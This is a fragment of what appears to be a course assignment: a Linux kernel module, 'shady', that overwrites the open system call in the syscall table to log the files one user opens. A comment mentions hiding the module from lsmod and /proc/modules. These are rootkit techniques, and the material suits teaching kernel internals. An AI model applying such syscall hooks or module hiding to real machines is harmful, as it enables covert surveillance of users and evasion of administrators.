...
static unsigned int watch_uid = 1000;
...
{
  // Get the current_uid struct
  kuid_t cur = current_uid();
  // See if this is Mark
  if (cur.val == watch_uid) {
    // If it is, print out the file he is opening
    printk("mark is about to open '%s'\n",file);
  }

  // Return the original open function
...
shady_init_module(void)
{
  ...
  // MODIFIED
  // Set the call table to RW
  set_addr_rw((unsigned long)system_call_table_address);
  // Save the old system call
  old_open = system_call_table_address[__NR_open];
  // Overwrite open to instead call my_open
  system_call_table_address[__NR_open] = my_open;


  // EXTRA CREDIT
  // This command hides the module from both lsmod and /proc/modules
  // Shady can not be unloaded with this line in
...
shady_exit_module(void)
{
  ...
  // MODIFIED
  // Restore open to call the original function
